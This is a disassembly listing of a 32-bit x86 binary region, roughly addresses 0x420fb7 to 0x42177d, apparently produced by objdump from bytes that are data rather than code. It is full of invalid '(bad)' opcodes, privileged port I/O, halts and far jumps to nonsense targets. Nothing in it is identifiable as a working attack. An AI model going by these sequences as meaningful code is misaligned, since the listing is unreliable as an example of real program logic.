  420fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb8:	jp     0x420f44
  420fba:	aaa    
  420fbb:	and    al,ah
  420fbd:	enter  0xc69e,0x63
  420fc1:	mov    ch,0x1b
  420fc3:	dec    edx
  420fc4:	or     eax,0x69567e4b
  420fc9:	jg     0x420fb3
  420fcb:	jns    0x42100d
  420fcd:	sbb    ebx,DWORD PTR ds:0x25126f26
  420fd3:	xor    BYTE PTR [ebp+0x26],ah
  420fd6:	std    
  420fd7:	sar    BYTE PTR [ecx],cl
  420fd9:	stos   DWORD PTR es:[edi],eax
  420fda:	jo     0x420fe9
  420fdc:	cs cdq 
  420fde:	ins    DWORD PTR es:[edi],dx
  420fdf:	xchg   esp,eax
  420fe0:	sub    bh,BYTE PTR [ecx-0x41b53598]
  420fe6:	or     eax,0xaf0bc228
  420feb:	jb     0x421026
  420fed:	add    eax,0x1905a02f
  420ff2:	rcr    BYTE PTR [eax+edi*2+0x2f],0x4e
  420ff7:	out    dx,eax
  420ff8:	xor    eax,0x6771733a
  420ffd:	retf   
  420ffe:	jno    0x420f83
  421000:	scas   al,BYTE PTR es:[edi]
  421001:	jns    0x42101b
  421003:	hlt    
  421004:	mov    eax,0x5ef9bd09
  421009:	iret   
  42100a:	arpl   sp,cx
  42100c:	cmp    bh,bl
  42100e:	enter  0xb507,0xdc
  421012:	pusha  
  421013:	or     BYTE PTR [ecx-0x38],dl
  421016:	imul   ebx,ecx,0xffffffc6
  421019:	mov    esi,DWORD PTR [esi]
  42101b:	pop    esp
  42101c:	push   ebx
  42101d:	mov    ds:0x6def76c6,eax
  421022:	adc    eax,0xc27a9a17
  421027:	cmp    al,0xd4
  421029:	out    0x36,eax
  42102b:	jg     0x421029
  42102d:	mov    al,0x63
  42102f:	aad    0x3e
  421031:	idiv   BYTE PTR [ebp+0x1108bfdb]
  421037:	mov    ebp,0x98c620dc
  42103c:	mov    al,0x42
  42103e:	scas   eax,DWORD PTR es:[edi]
  42103f:	lods   eax,DWORD PTR ds:[esi]
  421040:	dec    eax
  421041:	js     0x421063
  421043:	lods   al,BYTE PTR ds:[esi]
  421044:	dec    ecx
  421045:	mov    DWORD PTR [edx-0x64],esp
  421048:	pop    ebp
  421049:	push   ebp
  42104a:	mov    ecx,DWORD PTR [edx+0x69ac98dd]
  421050:	dec    edi
  421051:	xchg   esi,eax
  421052:	imul   edi,DWORD PTR [ebp+esi*1-0x5d9cac39],0xffffffdd
  42105a:	or     ebp,DWORD PTR [esp+0x6f]
  42105e:	sbb    BYTE PTR [eax+eiz*4],ah
  421061:	mov    bh,0xc1
  421063:	and    dl,cl
  421065:	(bad)  
  421066:	mov    al,ds:0x2365ea1c
  42106b:	xchg   DWORD PTR [eax],eax
  42106d:	inc    eax
  42106e:	loope  0x421098
  421070:	mov    ebx,0x8e7a92f7
  421075:	sub    DWORD PTR [ecx-0x54],esp
  421078:	xchg   esi,eax
  421079:	xor    edi,DWORD PTR [eax]
  42107b:	inc    esi
  42107c:	xor    esi,DWORD PTR [ebx+0x17]
  42107f:	mov    ecx,0x462c9291
  421084:	cmp    DWORD PTR [ebx],edi
  421086:	xchg   edx,eax
  421087:	pop    esp
  421088:	inc    ecx
  421089:	mov    dh,0xca
  42108b:	and    BYTE PTR [eax+esi*1+0x3c513ede],bl
  421092:	cmc    
  421093:	fist   WORD PTR [esi-0x21]
  421096:	mov    bh,0xa8
  421098:	adc    BYTE PTR [edx],bh
  42109a:	(bad)  
  42109b:	ds mov eax,0x49078e03
  4210a1:	call   DWORD PTR [edi]
  4210a3:	(bad)  
  4210a4:	push   ebp
  4210a5:	cmp    al,0x56
  4210a7:	iret   
  4210a8:	scas   eax,DWORD PTR es:[edi]
  4210a9:	add    eax,0x9df44ac8
  4210ae:	aaa    
  4210af:	in     eax,0x5d
  4210b1:	pop    eax
  4210b2:	int3   
  4210b3:	cli    
  4210b4:	out    dx,eax
  4210b5:	jno    0x4210cb
  4210b7:	je     0x42111b
  4210b9:	push   edi
  4210ba:	mov    ah,0xa9
  4210bc:	mov    al,0xf8
  4210be:	inc    ebp
  4210bf:	inc    ebx
  4210c0:	adc    eax,0x6bbeab48
  4210c5:	add    eax,0x8e10ef3
  4210ca:	cmovge eax,edx
  4210cd:	xor    eax,0x8be61fc
  4210d2:	pop    edx
  4210d3:	jne    0x4210bf
  4210d5:	sbb    eax,0x37fabb39
  4210da:	and    BYTE PTR [edx-0x53ac84a4],bl
  4210e0:	adc    al,0x95
  4210e2:	dec    ebx
  4210e3:	mov    ch,0x6
  4210e5:	xchg   ecx,eax
  4210e6:	xchg   BYTE PTR [edx+0xd],bh
  4210e9:	test   DWORD PTR [ecx-0xd],ebp
  4210ec:	mov    cl,0xf9
  4210ee:	inc    ebp
  4210ef:	mov    esi,0x3136636e
  4210f4:	loopne 0x421100
  4210f6:	mov    dl,BYTE PTR [eax+0x568e6d57]
  4210fc:	inc    edx
  4210fd:	daa    
  4210fe:	xlat   BYTE PTR ds:[ebx]
  4210ff:	rol    DWORD PTR [ebx+0x500b1254],1
  421105:	dec    ecx
  421106:	xchg   edx,eax
  421107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421108:	test   BYTE PTR [edx-0x17a5f63],0xaf
  42110f:	jmp    0x42117d
  421111:	ficom  WORD PTR [edx+ebp*4]
  421114:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421116:	xor    BYTE PTR [esi-0x4e802393],cl
  42111c:	cmp    edx,DWORD PTR [ebx-0x2c82e093]
  421122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421123:	adc    al,0x5b
  421125:	shl    DWORD PTR [ebx-0x19],1
  421128:	pop    ecx
  421129:	ins    DWORD PTR es:[edi],dx
  42112a:	xor    al,0x78
  42112c:	push   cs
  42112d:	mov    ch,0x77
  42112f:	test   al,0x70
  421131:	fcmovnb st,st(6)
  421133:	jmp    0x93198bf1
  421138:	mov    ebp,0x9b4eb2d0
  42113d:	fst    QWORD PTR [ebx-0x4efee811]
  421143:	in     eax,0xb0
  421145:	pop    eax
  421146:	rol    DWORD PTR [edx+ecx*2-0x2497e059],0x66
  42114e:	pushf  
  42114f:	xor    eax,0xb40f0ee6
  421154:	lock push edx
  421156:	adc    BYTE PTR [edx+0x15327ac8],bh
  42115c:	clc    
  42115d:	pop    ebx
  42115e:	xor    eax,0x598877fd
  421163:	cdq    
  421164:	fwait
  421165:	iret   
  421166:	pop    ss
  421167:	cmp    cl,BYTE PTR [esi-0x6e3f2262]
  42116d:	aad    0xab
  42116f:	loop   0x4211c3
  421171:	mov    DWORD PTR [ecx+0x5c],edi
  421174:	test   eax,0x54919d4f
  421179:	daa    
  42117a:	retf   0x66be
  42117d:	sub    esp,ecx
  42117f:	xchg   edi,eax
  421180:	(bad)  
  421182:	mov    eax,ds:0x7a4fbc1d
  421187:	fst    DWORD PTR [eax+0x5fb0e6e1]
  42118d:	stos   DWORD PTR es:[edi],eax
  42118e:	int    0x7e
  421190:	retf   0x4d43
  421193:	in     eax,0x37
  421195:	call   FWORD PTR [ebx-0x72]
  421198:	mov    dh,0x8a
  42119a:	sub    DWORD PTR [ebp+0x48],esi
  42119d:	fcmovne st,st(0)
  42119f:	out    0x21,al
  4211a1:	xor    esp,DWORD PTR [ecx-0x75e2b147]
  4211a7:	and    al,0x55
  4211a9:	ins    BYTE PTR es:[edi],dx
  4211aa:	push   esi
  4211ab:	cmp    esi,DWORD PTR [eax+0x6dc021a]
  4211b1:	sbb    dl,BYTE PTR [eax]
  4211b3:	outs   dx,BYTE PTR ds:[esi]
  4211b4:	ja     0x421190
  4211b6:	daa    
  4211b7:	mov    cs,WORD PTR [esi]
  4211b9:	mov    edx,DWORD PTR [eax]
  4211bb:	retf   0x268b
  4211be:	ds xchg esp,eax
  4211c0:	fmulp  st(3),st
  4211c2:	push   ecx
  4211c3:	popf   
  4211c4:	sub    dl,BYTE PTR [esi-0x2181b65f]
  4211ca:	push   ds
  4211cb:	inc    cx
  4211cd:	pusha  
  4211ce:	xchg   esp,eax
  4211cf:	pop    es
  4211d0:	shl    BYTE PTR [ebp-0x2b82b87a],cl
  4211d6:	inc    ebp
  4211d7:	or     eax,0xbe98ba52
  4211dc:	hlt    
  4211dd:	daa    
  4211de:	in     al,0x48
  4211e0:	in     al,0x2f
  4211e2:	dec    eax
  4211e3:	cs ret 0x9c5d
  4211e7:	pop    ebp
  4211e8:	jmp    0x1fb:0xb32588d
  4211ef:	js     0x42125d
  4211f1:	mov    DWORD PTR [eax+0x49],0x89a39d34
  4211f8:	aas    
  4211f9:	sbb    DWORD PTR [ebx],0x3a
  4211fc:	lods   eax,DWORD PTR ds:[esi]
  4211fd:	fnstsw WORD PTR [eax+0x5]
  421200:	scas   eax,DWORD PTR es:[edi]
  421201:	std    
  421202:	mov    gs,WORD PTR [ebx+0x428d8daf]
  421208:	cmc    
  421209:	scas   eax,DWORD PTR es:[edi]
  42120a:	jg     0x421237
  42120c:	push   ebp
  42120d:	lods   eax,DWORD PTR ds:[esi]
  42120e:	inc    edi
  42120f:	call   0x53e58716
  421214:	inc    ebp
  421215:	inc    edi
  421216:	pop    edi
  421217:	xchg   esp,eax
  421218:	inc    edi
  421219:	push   ebx
  42121a:	add    al,0x8f
  42121c:	or     DWORD PTR [esi-0x20fb8a1d],ebp
  421222:	imul   DWORD PTR [ebx+0x2d]
  421225:	stos   DWORD PTR es:[edi],eax
  421226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421227:	inc    esp
  421228:	add    BYTE PTR [edx+ebp*4-0x18],ch
  42122c:	stos   DWORD PTR es:[edi],eax
  42122d:	bound  ecx,QWORD PTR [ecx]
  42122f:	xor    ch,ah
  421231:	add    eax,0xbf30610f
  421236:	sti    
  421237:	xor    al,0x8c
  421239:	push   ebx
  42123a:	idiv   DWORD PTR [edx]
  42123c:	pushf  
  42123d:	dec    edi
  42123e:	dec    ebx
  42123f:	cmp    bl,BYTE PTR [ebx+esi*4]
  421242:	leave  
  421243:	pop    edi
  421244:	jmp    0xb4eed9b9
  421249:	sbb    BYTE PTR [ebx-0xd932316],bh
  42124f:	dec    ebx
  421250:	stos   DWORD PTR es:[edi],eax
  421251:	out    dx,al
  421252:	loope  0x4212ad
  421254:	dec    ecx
  421255:	jns    0x421239
  421257:	cdq    
  421258:	cli    
  421259:	cmc    
  42125a:	aas    
  42125b:	mov    al,ds:0x9c76eed1
  421260:	mov    DWORD PTR [ebx+0x55663eae],eax
  421266:	cmp    eax,0x6afda4c5
  42126b:	pop    esp
  42126c:	mov    ch,BYTE PTR [eax-0x31]
  42126f:	and    al,0x2c
  421271:	mov    al,0xce
  421273:	(bad)  
  421274:	ror    ch,1
  421276:	fist   DWORD PTR [esi+ebp*4-0x3dca2d27]
  42127d:	pop    eax
  42127e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127f:	add    DWORD PTR [esi-0x7e229d8a],0x34
  421286:	rcr    DWORD PTR [edi-0x66],1
  421289:	in     eax,dx
  42128a:	dec    ebx
  42128b:	mov    ds:0x805c5770,eax
  421290:	pop    ds
  421291:	dec    edi
  421292:	pop    edx
  421293:	in     eax,0xa1
  421295:	inc    ebx
  421296:	daa    
  421297:	ret    
  421298:	or     eax,0xb211168b
  42129d:	xor    DWORD PTR [esi-0x20],edi
  4212a0:	js     0x42130b
  4212a2:	shr    DWORD PTR [edx-0x26a6aa29],0x2c
  4212a9:	stos   BYTE PTR es:[edi],al
  4212aa:	dec    edx
  4212ab:	retf   0xb025
  4212ae:	jp     0x4212da
  4212b0:	mov    esp,0xf3614bc2
  4212b5:	mov    ecx,0xeb3344a0
  4212ba:	sub    al,cl
  4212bc:	(bad)  
  4212bd:	in     al,dx
  4212be:	mov    bh,0xb2
  4212c0:	imul   ebp,eax,0xffffffab
  4212c3:	and    DWORD PTR [ebx],esi
  4212c5:	sbb    eax,0x325705f8
  4212ca:	push   0x70e1e0ca
  4212cf:	popf   
  4212d0:	test   al,0xec
  4212d2:	mov    ds:0xc55e0a7d,eax
  4212d7:	jns    0x421278
  4212d9:	push   edx
  4212da:	or     al,0x42
  4212dd:	in     al,dx
  4212de:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4212e0:	jp     0x421324
  4212e2:	inc    edx
  4212e3:	fisttp QWORD PTR [esi+0x27]
  4212e6:	mov    ah,0x60
  4212e8:	aam    0x80
  4212ea:	dec    esp
  4212eb:	in     al,0x88
  4212ed:	jns    0x42132d
  4212ef:	dec    ebp
  4212f0:	rcl    DWORD PTR [edi],cl
  4212f2:	pop    es
  4212f3:	sahf   
  4212f4:	(bad)  
  4212f5:	pop    ds
  4212f6:	sub    dh,cl
  4212f8:	xchg   ecx,eax
  4212f9:	or     al,0xcb
  4212fb:	dec    ebp
  4212fc:	mov    BYTE PTR [ebp+0x53],0x72
  421300:	pop    ebp
  421301:	pop    ss
  421302:	outs   dx,BYTE PTR ds:[esi]
  421303:	push   0x2a
  421305:	push   0x3
  421307:	std    
  421308:	aaa    
  421309:	push   esi
  42130a:	jl     0x421338
  42130c:	xor    DWORD PTR [esi-0x3e969ce8],edx
  421312:	jle    0x421296
  421314:	mov    cl,0x76
  421316:	cwde   
  421317:	cmp    BYTE PTR [ebx+0x63],bh
  42131a:	adc    bl,BYTE PTR [edi+0x36]
  42131d:	enter  0x6506,0x1f
  421321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421322:	nop    eax
  421325:	add    DWORD PTR [esi],esp
  421327:	adc    dh,ah
  421329:	push   ss
  42132a:	push   ss
  42132b:	addr16 jbe 0x4212bd
  42132e:	inc    edi
  42132f:	pop    eax
  421330:	mov    edx,0x2c5b1fcb
  421335:	adc    DWORD PTR [esi+ebp*1-0x51009028],ecx
  42133c:	popa   
  42133d:	in     eax,dx
  42133e:	push   0xab6a73a0
  421343:	xor    al,0xaa
  421345:	in     al,0x41
  421347:	push   eax
  421348:	shr    BYTE PTR [ebx-0x6c91268a],1
  42134e:	out    0x88,al
  421350:	add    eax,0x2ad2fe1
  421355:	inc    esi
  421356:	mov    bl,0xa0
  421358:	(bad)  
  421359:	jp     0x4213b3
  42135b:	shl    DWORD PTR [edx],cl
  42135d:	jnp    0x4212f3
  42135f:	jmp    0xbaf2:0xd9aac929
  421366:	push   ds
  421367:	jp     0x421313
  421369:	(bad)  
  42136a:	push   esp
  42136b:	loopne 0x421383
  42136d:	lock mov bh,0x57
  421370:	jbe    0x4213e5
  421372:	xor    eax,0x9dfd42e1
  421377:	pop    eax
  421378:	inc    esp
  421379:	push   ebp
  42137a:	mov    bl,0x9e
  42137c:	ja     0x4213da
  42137e:	cmc    
  42137f:	pushf  
  421380:	(bad)  
  421381:	jmp    0xb80f:0x7a402d94
  421388:	(bad)  
  421389:	outs   dx,BYTE PTR ds:[esi]
  42138a:	(bad)  
  42138b:	leave  
  42138c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42138e:	mov    dl,0x73
  421390:	mov    edi,0x462caf85
  421395:	or     eax,0x9ac3efe3
  42139a:	or     BYTE PTR [eax],cl
  42139c:	xchg   edx,ecx
  42139e:	lahf   
  42139f:	pop    esi
  4213a0:	sub    al,0x67
  4213a2:	call   0x509:0x40ec7dbd
  4213a9:	push   cs
  4213aa:	ror    DWORD PTR [edx-0x761041e9],cl
  4213b0:	test   dh,ah
  4213b2:	cmp    al,0x40
  4213b4:	dec    esp
  4213b5:	sbb    BYTE PTR [ebp+0x3d],dl
  4213b8:	in     al,dx
  4213b9:	imul   edi,DWORD PTR [ecx-0x2412b474],0x1c
  4213c0:	mov    eax,0x7e920a58
  4213c5:	fimul  WORD PTR [esi]
  4213c7:	mov    edi,0x804ad89a
  4213cc:	jae    0x421419
  4213ce:	ja     0x4213f1
  4213d0:	in     eax,0x67
  4213d2:	push   ebx
  4213d3:	mov    ds:0xec20e852,al
  4213d8:	fadd   st,st(4)
  4213da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213db:	inc    ebp
  4213dc:	mov    edx,0x33897fa8
  4213e1:	xchg   edx,eax
  4213e2:	xchg   ebx,eax
  4213e3:	jecxz  0x42138b
  4213e5:	leave  
  4213e6:	int3   
  4213e7:	iret   
  4213e8:	cdq    
  4213e9:	add    bl,dh
  4213eb:	in     al,dx
  4213ec:	enter  0x4c0c,0xf0
  4213f0:	scas   al,BYTE PTR es:[edi]
  4213f1:	adc    WORD PTR [ebx-0x5d3e3d0a],cx
  4213f8:	lds    eax,FWORD PTR [ebx]
  4213fa:	sbb    eax,0x180784d8
  4213ff:	repnz test eax,0xc0da99df
  421405:	add    eax,0xb6f18e62
  42140a:	stc    
  42140b:	addr16 int3 
  42140d:	push   es
  42140e:	adc    edi,DWORD PTR [edx+0x289968ae]
  421414:	cwde   
  421415:	mov    ebx,DWORD PTR [esp+ebp*4]
  421418:	sbb    eax,DWORD PTR [esi+0x19]
  42141b:	test   DWORD PTR [eax],ebx
  42141d:	mov    edi,0x6827d701
  421422:	in     al,dx
  421423:	mov    edi,0xc2eeb7aa
  421428:	dec    edi
  421429:	mov    esp,0x84eef268
  42142e:	pop    ebp
  42142f:	out    dx,eax
  421430:	jge    0x421485
  421432:	shr    cl,cl
  421434:	push   cs
  421435:	je     0x42143e
  421437:	popa   
  421438:	xlat   BYTE PTR ds:[ebx]
  421439:	je     0x421408
  42143b:	push   es
  42143c:	and    ch,BYTE PTR [edi]
  42143e:	mov    dl,0xc4
  421440:	out    dx,al
  421441:	xor    eax,0x84c5a577
  421446:	xchg   edi,eax
  421447:	test   eax,0xd491d2a
  42144c:	lods   al,BYTE PTR ds:[esi]
  42144d:	add    al,0xf2
  42144f:	xchg   ecx,eax
  421450:	jg     0x4214b6
  421452:	scas   al,BYTE PTR es:[edi]
  421453:	sbb    cl,BYTE PTR [esi-0x65]
  421456:	popa   
  421457:	cmp    bl,BYTE PTR [esi]
  421459:	or     DWORD PTR ds:0xe41a64ea,0xffffff95
  421460:	mov    ss,esi
  421462:	or     al,0x87
  421464:	lods   al,BYTE PTR ds:[esi]
  421465:	jp     0x421426
  421467:	jge    0x421482
  421469:	xchg   edi,eax
  42146a:	bound  edi,QWORD PTR [esi+0x12]
  42146d:	rol    BYTE PTR [eax+0x62],0x50
  421471:	sti    
  421472:	xadd   BYTE PTR [esp+esi*1],cl
  421476:	mov    esp,0xcb16d244
  42147b:	mov    dh,0x97
  42147d:	cmc    
  42147e:	or     edx,DWORD PTR [edx+eax*1-0x74]
  421482:	(bad)  
  421483:	std    
  421484:	inc    edi
  421485:	or     dl,BYTE PTR [esi+0x20]
  421488:	xchg   ebx,eax
  421489:	hlt    
  42148a:	jns    0x4214c8
  42148c:	popf   
  42148d:	pop    es
  42148e:	mov    ecx,0xf1bb4fc5
  421493:	sbb    al,0x78
  421495:	jns    0x4214df
  421497:	sahf   
  421498:	call   0x6168183d
  42149d:	adc    cl,BYTE PTR [eax+0x13]
  4214a0:	fdecstp 
  4214a2:	arpl   ax,bx
  4214a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214a5:	adc    eax,0xf5e8802f
  4214aa:	imul   edx,DWORD PTR [ecx+0xe],0xffffff82
  4214ae:	jecxz  0x421453
  4214b0:	pusha  
  4214b1:	sub    DWORD PTR [ecx],esi
  4214b3:	daa    
  4214b4:	cmp    al,0x27
  4214b6:	in     al,0x2c
  4214b8:	sbb    eax,0xb240ff5c
  4214bd:	gs mov di,0xb84b
  4214c2:	outs   dx,DWORD PTR ds:[esi]
  4214c3:	pop    edi
  4214c4:	dec    ecx
  4214c5:	inc    eax
  4214c6:	popf   
  4214c7:	mov    ch,0xac
  4214c9:	sbb    ebp,DWORD PTR [ebx-0x24986539]
  4214cf:	ret    
  4214d0:	jge    0x421455
  4214d2:	jmp    0x680c:0x2129431f
  4214d9:	adc    BYTE PTR [esi-0x1a],bh
  4214dc:	and    BYTE PTR [eax-0x2b],0xf1
  4214e0:	loop   0x421544
  4214e2:	lods   eax,DWORD PTR ds:[esi]
  4214e3:	sub    ebx,esi
  4214e5:	leave  
  4214e6:	sub    edx,ecx
  4214e8:	je     0x421544
  4214ea:	pop    ecx
  4214eb:	inc    edx
  4214ec:	xor    al,0xbf
  4214ee:	jae    0x421512
  4214f0:	jnp    0x4214f3
  4214f2:	sbb    ch,ah
  4214f4:	adc    al,ah
  4214f6:	add    eax,0x874600
  4214fb:	push   ecx
  4214fc:	aaa    
  4214fd:	aad    0x63
  4214ff:	push   0x92e800
  421504:	inc    edx
  421505:	(bad)  
  421507:	mov    edx,0xb2c178ba
  42150c:	xchg   ebp,eax
  42150d:	inc    ebp
  42150e:	ret    
  42150f:	inc    BYTE PTR [eax+edx*8-0x2d]
  421513:	and    ebx,DWORD PTR [ebx-0x15]
  421516:	pop    es
  421517:	jle    0x421548
  421519:	jecxz  0x42157b
  42151b:	mov    edi,0x5bbf2768
  421520:	icebp  
  421521:	arpl   bx,si
  421523:	jmp    0x42157e
  421525:	jmp    0x941c:0x3a47e2a2
  42152c:	in     al,dx
  42152d:	sahf   
  42152e:	lods   al,BYTE PTR ds:[esi]
  42152f:	inc    eax
  421530:	push   ecx
  421531:	add    eax,0x7a4fd8b9
  421536:	lea    esi,ds:0xb9ddb3ec
  42153c:	xor    al,0xcb
  42153e:	adc    DWORD PTR [ecx+0x995cab],esi
  421544:	xor    ecx,DWORD PTR [eax]
  421546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421547:	mov    esp,0xe74dbcb8
  42154c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42154d:	push   ebx
  42154e:	fisttp QWORD PTR [esi]
  421550:	gs jmp 0xb9f8:0xe3f36396
  421558:	and    al,0xd2
  42155a:	add    edi,DWORD PTR [edi-0x6d]
  42155d:	fwait
  42155e:	stc    
  42155f:	ret    
  421560:	and    eax,esp
  421562:	and    DWORD PTR [eax],0xffffffcb
  421565:	int3   
  421566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421567:	push   0x38
  421569:	adc    BYTE PTR [edi],ch
  42156b:	dec    eax
  42156c:	das    
  42156d:	push   edx
  42156e:	sbb    al,0x2b
  421570:	cmp    al,0xb
  421572:	lds    edi,FWORD PTR [ebx+0x4bdd1568]
  421578:	dec    eax
  421579:	dec    edi
  42157a:	sub    eax,0xdd2a473a
  42157f:	test   BYTE PTR [esi],dl
  421581:	mov    eax,ds:0x73d8b3ce
  421586:	in     eax,dx
  421587:	lea    ebp,[edi+0x54]
  42158a:	mov    eax,0x21e775d8
  42158f:	out    dx,eax
  421590:	rcl    DWORD PTR [eax-0x7c189ed3],1
  421596:	dec    edi
  421597:	push   es
  421598:	mov    DWORD PTR [edi+0x6260c04],edi
  42159e:	or     cl,BYTE PTR [eax]
  4215a0:	loope  0x421620
  4215a2:	sub    edx,edx
  4215a4:	dec    esp
  4215a5:	mov    ebp,0xe2e23db4
  4215aa:	xor    DWORD PTR [ecx-0x80],ecx
  4215ad:	adc    DWORD PTR [ebx+0x7e],eax
  4215b0:	ret    
  4215b1:	xacquire xchg BYTE PTR [ebp-0x18],ch
  4215b5:	xor    esi,DWORD PTR ds:0xcf1c4ad7
  4215bb:	jge    0x4215f0
  4215bd:	scas   al,BYTE PTR es:[edi]
  4215be:	inc    edi
  4215bf:	push   edi
  4215c0:	into   
  4215c1:	pop    ebx
  4215c2:	shl    DWORD PTR [ebx-0x78],0xf
  4215c6:	cld    
  4215c7:	xchg   dh,dh
  4215c9:	cmc    
  4215ca:	mov    ds,WORD PTR [esi+ebp*8+0x237b0391]
  4215d1:	out    dx,eax
  4215d2:	fild   WORD PTR [esi+0x12eb93ae]
  4215d8:	xor    al,0xc7
  4215da:	adc    BYTE PTR [ecx],0xb
  4215dd:	inc    ecx
  4215de:	mov    eax,0x515c1b82
  4215e3:	or     dl,bh
  4215e5:	(bad)  
  4215e6:	push   ebx
  4215e7:	jae    0x4215ac
  4215e9:	test   al,0xe7
  4215eb:	jnp    0x4215bb
  4215ed:	sar    DWORD PTR [eiz*2-0x13b38b26],1
  4215f4:	int    0x62
  4215f6:	mov    al,ds:0xd1a444aa
  4215fb:	mov    ?,WORD PTR [ebx*8-0x615a219b]
  421602:	out    0x76,al
  421604:	or     DWORD PTR [eax],esp
  421606:	mov    ebp,0xe199da
  42160b:	push   ecx
  42160c:	not    BYTE PTR [edx+0x5ea26607]
  421612:	shr    DWORD PTR [edi+0x6e256841],0xcc
  421619:	adc    DWORD PTR [ebx-0xf],edi
  42161c:	pusha  
  42161d:	push   esp
  42161e:	push   0x14
  421620:	fwait
  421621:	xchg   ecx,eax
  421622:	or     eax,0x179a311c
  421627:	and    edx,DWORD PTR [edx-0x43]
  42162a:	sahf   
  42162b:	jns    0x421615
  42162d:	pop    eax
  42162e:	inc    ecx
  42162f:	fistp  WORD PTR [ecx-0x20]
  421632:	push   cs
  421633:	inc    ebx
  421634:	(bad)  
  421635:	ss pop ds
  421637:	retf   0x4e81
  42163a:	ins    BYTE PTR es:[edi],dx
  42163b:	fisubr DWORD PTR [ebx-0x1a]
  42163e:	dec    esi
  42163f:	ins    DWORD PTR es:[edi],dx
  421640:	mov    ecx,0x818ac398
  421645:	cwde   
  421646:	jbe    0x42160f
  421648:	inc    ebx
  421649:	mov    ds:0x8c139c66,al
  42164e:	hlt    
  42164f:	mov    ?,WORD PTR [ecx+edx*1]
  421652:	dec    esi
  421653:	jecxz  0x421695
  421655:	and    al,0x4c
  421657:	dec    ecx
  421658:	mov    ?,WORD PTR [edx-0x5c]
  42165b:	scas   eax,DWORD PTR es:[edi]
  42165c:	jp     0x421639
  42165e:	mov    bh,0x72
  421660:	sbb    BYTE PTR [esi],0xf7
  421663:	dec    esi
  421664:	push   edi
  421665:	ins    DWORD PTR es:[edi],dx
  421666:	in     eax,0x82
  421668:	jnp    0x4215f6
  42166a:	ja     0x42163c
  42166c:	popf   
  42166d:	ror    dh,0x11
  421670:	stc    
  421671:	xchg   ebx,eax
  421672:	retf   0xfde4
  421675:	nop
  421676:	push   edi
  421677:	push   eax
  421678:	pop    ebx
  421679:	jo     0x42162d
  42167b:	stos   BYTE PTR es:[edi],al
  42167c:	jb     0x421684
  42167e:	ja     0x4216d4
  421680:	push   cs
  421681:	adc    DWORD PTR [edx+0x5ad5c73f],0x32264535
  42168b:	xor    edx,eax
  42168d:	fld    TBYTE PTR [ecx+edx*8-0x3f1ee2a1]
  421694:	ror    DWORD PTR [ebp-0x1a],1
  421697:	jp     0x4216ef
  421699:	stos   DWORD PTR es:[edi],eax
  42169a:	loope  0x4216f6
  42169c:	xchg   ecx,eax
  42169d:	test   BYTE PTR [eax-0x5ebb1763],bh
  4216a3:	aas    
  4216a4:	jnp    0x421717
  4216a6:	mov    BYTE PTR [edx],bl
  4216a8:	mov    ch,dl
  4216aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216ab:	shrd   DWORD PTR [edi+ebp*4],eax,0xb3
  4216b0:	or     eax,0x53d2c661
  4216b5:	mov    ecx,0xa35a9189
  4216ba:	dec    esp
  4216bb:	loope  0x4216c2
  4216bd:	sub    BYTE PTR [edi+0x1c],al
  4216c0:	dec    edi
  4216c1:	sub    edi,DWORD PTR [edx+0x1f]
  4216c4:	push   ecx
  4216c5:	js     0x4216d3
  4216c7:	xlat   BYTE PTR ds:[ebx]
  4216c8:	imul   esi,DWORD PTR [eax+0x75],0xd61dc71f
  4216cf:	psrad  mm2,QWORD PTR [edi+edi*2-0x28186ce8]
  4216d7:	es or  al,0x4a
  4216da:	ins    DWORD PTR es:[edi],dx
  4216db:	add    eax,0x9231a268
  4216e0:	mov    DWORD PTR [eax],ebp
  4216e2:	les    ebp,FWORD PTR [edi+0x560e4654]
  4216e8:	test   BYTE PTR [eax],al
  4216ea:	dec    esi
  4216eb:	enter  0x1927,0x81
  4216ef:	(bad)  
  4216f0:	fnstenv [edx]
  4216f2:	mov    al,0x4c
  4216f4:	xor    DWORD PTR [eax],0xa1918230
  4216fa:	jbe    0x4216e6
  4216fc:	fsubrp st(2),st
  4216fe:	nop
  4216ff:	mov    esi,0x7acf9537
  421704:	mov    ebx,0x34734f99
  421709:	dec    ebp
  42170a:	and    dh,BYTE PTR [ebx-0x2]
  42170d:	jns    0x4216a5
  42170f:	aam    0x20
  421711:	lahf   
  421712:	mov    cl,0x1
  421714:	stos   BYTE PTR es:[edi],al
  421715:	jmp    0x1118:0xddcc6315
  42171c:	xchg   ebp,eax
  42171d:	push   eax
  42171e:	sub    ah,BYTE PTR [ecx]
  421720:	dec    ebp
  421721:	and    DWORD PTR [ebp-0x3254804b],ebx
  421727:	adc    ebp,DWORD PTR [esi-0x7f]
  42172a:	jbe    0x42175b
  42172c:	hlt    
  42172d:	and    al,0xa4
  42172f:	inc    ebx
  421730:	(bad)  
  421731:	fs mov ecx,0x37e2bde4
  421737:	adc    BYTE PTR [ecx],ch
  421739:	sbb    edx,DWORD PTR ds:0xe8d41b10
  42173f:	mov    edx,0x69f20c2c
  421744:	xor    eax,0x7d04d4c0
  421749:	jl     0x421770
  42174b:	mov    eax,ds:0xce7e4dc4
  421750:	xor    bh,BYTE PTR [edi-0x5804a881]
  421756:	cmp    eax,0x794238ea
  42175b:	jg     0x421771
  42175d:	xchg   DWORD PTR [ebx],eax
  42175f:	jle    0x421710
  421761:	mov    eax,ds:0x527cb959
  421766:	ror    DWORD PTR [esi+0xb575d4],0x91
  42176d:	in     eax,0xf3
  42176f:	sub    bl,BYTE PTR [ebx-0x47322405]
  421775:	pushf  
  421776:	dec    edx
  421777:	adc    eax,0xeea64c5a
  42177c:	into   
  42177d:	sbb    BYTE PTR [ebx+0x3d03834],bh
